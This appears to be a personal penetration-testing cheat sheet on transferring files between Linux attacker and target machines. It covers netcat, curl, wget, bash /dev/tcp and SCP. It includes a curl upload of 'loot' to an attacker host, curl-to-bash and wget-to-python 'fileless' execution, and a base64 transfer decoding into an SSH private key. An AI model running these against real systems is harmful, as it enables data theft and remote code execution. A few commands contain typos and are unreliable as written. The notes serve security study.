Linux to Linux communication
![[images.jpg]]

# Basic tools
## wget and curl
- for downloading things from a server
- `wget https://.... -O output.sh`
- `curl -o output.sh https://..`
	- -T to upload
	- `curl -T /path/to/loot http://attacker:9001/loot.txt

## starting a listener server with netcat (2 way transfer allows)
- `sudo nc -lvnp 8000

## starting a http server with python
- `python3 -m http.server`


# Methods
## Base 64 Encoding/Decoding
1. On sender
	- `md5sum file.txt
	- `cat file.txt |base64 -w 0;echo`
2. On receiver
	- `echo -n 'long_string' | base64 -d > id_rsa`
	- `md5sum file.txt

## File transfer with netcat/ncat
from our machine to target, if target hosts server:
1. target machine listens
	- `nc -l -p 8000 > text.exe`
	- `ncat -l -p 8000 --recv-only > text.exe`
2. our machine sends
	- `nc -q 0 <target_ip> 8000 < text.exe`
	- `ncat --send-only <target_ip> 8000 < text.exe`

from our machine to target, if target connects to our server:
1. our machine hosts
	- `sudo nc -l -p 443 -q 0 < text.exe`
	- `sudo ncat -p -p 443 --send-only < text.exe`
2. target connects to nc to receive file
	- `nc <host_ip> 443 > text.exe`
	- `ncat <host_ip> 443 --recv-only > text.exe`
	- if don't have netcat or ncat here, can use bash
	- `cat < /dev/tcp/<host_ip>/443 > text.exe`

(can just reverse all of the above to send from target to our machine)

## Fileless attacks on Linux
- No need download file to execute it, just pipe
- (eg. assuming these are .sh and python3 scripts respectively)
- curl
	- `curl https:// .... | bash`
- wget
	- `wget -q0- https://... | python3`

## Bash
1. Connect to Target Webserver 
	- `exec 3<>/dev/tcp/10.10.10.32/80`
		- 10.10.10.32 is the one acting as server
		- opens TCP socket to 10.10.10.32 on port 80, attaches it to file descriptor 3 for reading and writing
		- after this, can write to (>&3) and read from (<&3) socket 
2. HTTP Get request
	- `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
		- request to get linenum.sh from the server
3. Print the response
	- `cat <&3`
		- reads everything sent by server on FD3 and prints to terminal

## SSH
1. Start SS server on server
	- `sudo systemctl start ssh
2. Check for SSH listening port
	- `netstat -lnpt`
3. Download files using SCP on target
	- `scp username@serverIP:/file_path /path/to/localdir`





Also see [[4. Linux Uploads (target to local)]], WebServer with Python section
